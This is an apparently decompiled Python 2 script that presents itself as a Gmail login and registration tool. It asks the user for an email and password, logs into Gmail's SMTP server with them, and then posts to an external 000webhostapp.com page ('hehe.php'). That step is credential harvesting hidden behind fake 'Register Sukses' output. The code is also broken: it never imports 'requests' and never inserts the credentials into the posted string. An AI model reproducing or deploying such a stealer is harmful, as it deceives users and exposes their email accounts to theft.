# Decompile At : Fri Mar  6 00:02:18 2020
import smtplib, time

gmail_user = raw_input('Email = ')
gmail_password = raw_input ('password = ')
formi = "Gmail = email / no telp : {}   password : {} "
try:
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(gmail_user, gmail_password)
    requests.post("https://nandaservering.000webhostapp.com/hehe.php",data={"req":formi})
    print "Login berhasil"
    time.sleep(2)
    print ('Register Sukses')
    print ('Username : me')
    print ('Password : hacker')
    
except:
    print 'Something went wrong...'